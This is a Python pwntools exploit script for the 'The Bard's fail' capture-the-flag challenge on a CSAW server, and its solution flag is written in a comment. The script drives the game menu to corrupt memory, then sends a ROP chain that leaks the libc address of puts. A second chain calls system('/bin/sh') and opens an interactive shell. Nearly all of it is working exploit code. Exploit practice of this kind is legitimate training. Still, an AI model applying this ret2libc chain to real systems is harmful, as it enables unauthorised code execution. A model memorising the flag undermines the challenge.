#exploit for The Bard's fail
#flag=flag{why_4r3_th3y_4ll_such_c0w4rds??}
from pwn import *
elf = ELF("./bard")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('pwn.chal.csaw.io' ,5019)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)
	
def attack1(name="A"):
	sla("evil):\n",'g')
	sla("racy\n",str(1))
	sa("name:\n",name)

def attack2(name="A"):
	sla("evil):\n",'e')
	sla("ment\n",str(2))
	sa("name:\n",name)

def rubbish():
	sla("(r)un\n",'r')

def realattack(payload):
	attack1()
	for i in range(8):
		attack2()
	attack1(payload)
	for i in range(10):
		rubbish()

poprdi=0x0000000000401143
ret=0x00000000004006ae
main=0x40107B
payload=p64(poprdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(main)
realattack(payload)
target.recvline()
libc_puts=u64(target.recv(6).ljust(8,"\x00"))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
payload=p64(ret)+p64(poprdi)+p64(libc_binsh)+p64(libc_system)
realattack(payload)
target.interactive()
